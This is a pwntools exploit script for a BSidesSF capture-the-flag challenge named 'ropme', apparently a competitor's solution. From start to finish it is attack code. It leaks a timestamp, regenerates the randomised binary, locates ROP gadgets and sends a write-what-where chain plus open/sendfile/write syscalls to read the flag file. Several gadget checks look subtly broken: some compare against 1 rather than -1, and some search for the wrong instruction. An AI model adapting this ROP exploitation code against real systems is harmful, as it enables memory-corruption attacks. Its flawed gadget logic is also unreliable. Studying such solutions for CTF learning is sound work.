#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *
import os
context.terminal = ['kitty', '-e', 'sh', '-c']
exe = context.binary = ELF('./chall')

host = args.HOST or 'ropme-63513a97.challenges.bsidessf.net'
port = int(args.PORT or 1338)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *main
b *main+395
continue
'''.format(**locals())

io = start()
io.recvuntil("The current time is: ")
leak = int(io.recvline())
print("generating RNG for %s " % leak)
os.system("rm -f RNG && ./RNG %s" % str(leak))
print("RNG completed")

rop = open('RNG', 'rb').read()
pie_base = 0x13370000

pop_eax   = pie_base + rop.find(asm('pop eax; ret'))
pop_ecx   = pie_base + rop.find(asm('pop ecx; ret'))
pop_ebx   = pie_base + rop.find(asm('pop ebx; ret'))
pop_edx   = pie_base + rop.find(asm('pop edx; ret'))
pop_ebp   = pie_base + rop.find(asm('pop ebp; ret'))
pop_esi   = pie_base + rop.find(asm('pop esi; ret'))
pop_edi   = pie_base + rop.find(asm('pop edi; ret'))
mov_eax_ecx   = pie_base + rop.find(asm('mov [eax], ecx; ret'))
bss = 0x13371337
write_what_where = b""


addr = -1
reg1 = 0
reg2 = 0

if (addr == -1 and rop.find(asm('mov [eax], ebx; ret')) != 1):
    reg1 = pop_ebx
    reg2 = pop_eax
    addr = rop.find(asm('mov [eax], ebx; ret'))  

if (addr == -1 and rop.find(asm('mov [eax], ecx; ret')) != -1):
    reg1 = pop_ecx
    reg2 = pop_eax
    addr = rop.find(asm('mov [eax], ecx; ret'))

if (addr == -1 and rop.find(asm('mov [eax], edx; ret')) != -1):
    reg1 = pop_edx
    reg2 = pop_eax
    addr = rop.find(asm('mov [eax], edx; ret'))

if (addr == -1 and rop.find(asm('mov [eax], esi; ret')) != -1):
    reg1 = pop_esi
    reg2 = pop_eax
    addr = rop.find(asm('mov [eax], esi; ret'))

if (addr == -1 and rop.find(asm('mov [eax], edi; ret')) != -1):
    reg1 = pop_edi
    reg2 = pop_eax
    addr = rop.find(asm('mov [eax], edi; ret'))

if (addr == -1 and rop.find(asm('mov [ebx], ecx; ret')) != 1):
    reg1 = pop_ecx
    reg2 = pop_ebx
    addr = rop.find(asm('mov [eax], ebx; ret'))  

if (addr == -1 and rop.find(asm('mov [ebx], edx; ret')) != -1):
    reg1 = pop_edx
    reg2 = pop_ebx
    addr = rop.find(asm('mov [eax], ecx; ret'))

if (addr == -1 and rop.find(asm('mov [ebx], esi; ret')) != -1):
    reg1 = pop_esi
    reg2 = pop_ebx
    addr = rop.find(asm('mov [eax], edx; ret'))

if (addr == -1 and rop.find(asm('mov [ebx], edi; ret')) != -1):
    reg1 = pop_edi
    reg2 = pop_ebx
    addr = rop.find(asm('mov [eax], esi; ret'))

if (addr == -1 and rop.find(asm('mov [ebx], eax; ret')) != -1):
    reg1 = pop_eax
    reg2 = pop_ebx
    addr = rop.find(asm('mov [eax], edi; ret'))

print(addr)
print("mov [eax], ebx; ret")
write_what_where += p32(reg2)
write_what_where += p32(bss)
write_what_where += p32(reg1)
write_what_where += b"/hom" 
write_what_where += p32(pie_base + addr)

write_what_where += p32(reg2)
write_what_where += p32(bss + 4)
write_what_where += p32(reg1)
write_what_where += b"e/ct" 
write_what_where += p32(pie_base + addr)

write_what_where += p32(reg2)
write_what_where += p32(bss + 8)
write_what_where += p32(reg1)
write_what_where += b"f/fl" 
write_what_where += p32(pie_base + addr)

write_what_where += p32(reg2)
write_what_where += p32(bss + 12)
write_what_where += p32(reg1)
write_what_where += b"ag.t" 
write_what_where += p32(pie_base + addr)

write_what_where += p32(reg2)
write_what_where += p32(bss + 16)
write_what_where += p32(reg1)
write_what_where += b"xt\x00\x00"
write_what_where += p32(pie_base + addr)

syscall   = pie_base + rop.find(asm('int 0x80; ret'))

rop = b''
rop += write_what_where
rop += flat([

    pop_eax,
    0x05,
    pop_ebx,
    bss,
    pop_ecx,
    0,
    pop_edx,
    0,
    syscall,
    pop_eax,
    187,
    pop_ebx,
    1,
    pop_ecx,
    0,
    pop_edx,
    0,
    pop_esi,
    100,
    syscall,
    pop_eax,
    4,
    pop_ebx,
    1,
    pop_ecx,
    bss,
    pop_edx,
    20,
    syscall


])
log.info("POP EAX : %s " % hex(pop_eax))
log.info("POP EDX : %s " % hex(pop_edx))
log.info("POP ECX : %s " % hex(pop_ecx))
log.info("SYSCALL : %s " % hex(syscall))
io.recvuntil("And to show you we're serious, you have 9 seconds.\n\n")
io.send(rop)
print(io.recvall())
io.close()